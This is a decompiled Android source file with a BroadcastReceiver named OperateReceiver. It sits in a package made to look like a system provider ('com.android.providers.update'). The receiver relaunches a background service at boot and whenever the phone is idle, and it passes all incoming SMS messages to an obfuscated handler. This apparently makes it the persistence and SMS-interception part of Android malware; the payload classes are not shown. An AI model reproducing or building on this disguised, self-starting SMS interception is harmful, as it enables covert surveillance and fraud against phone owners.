package com.android.providers.update;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.telephony.TelephonyManager;

public class OperateReceiver extends BroadcastReceiver {
    public void onReceive(Context context, Intent intent) {
        Class<OperateService> cls = OperateService.class;
        try {
            String action = intent.getAction();
            if (action.equalsIgnoreCase("android.intent.action.BOOT_COMPLETED")) {
                Intent intent2 = new Intent(context, OperateService.class);
                intent2.setFlags(268435456);
                context.startService(intent2);
            } else if (action.equalsIgnoreCase("android.provider.Telephony.SMS_RECEIVED")) {
                af.a(intent, this, context);
            } else if (action.equalsIgnoreCase("android.intent.action.PHONE_STATE") && ((TelephonyManager) context.getSystemService("phone")).getCallState() == 0) {
                System.out.println("IDLE");
                Intent intent3 = new Intent(context, OperateService.class);
                intent3.setFlags(268435456);
                context.startService(intent3);
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
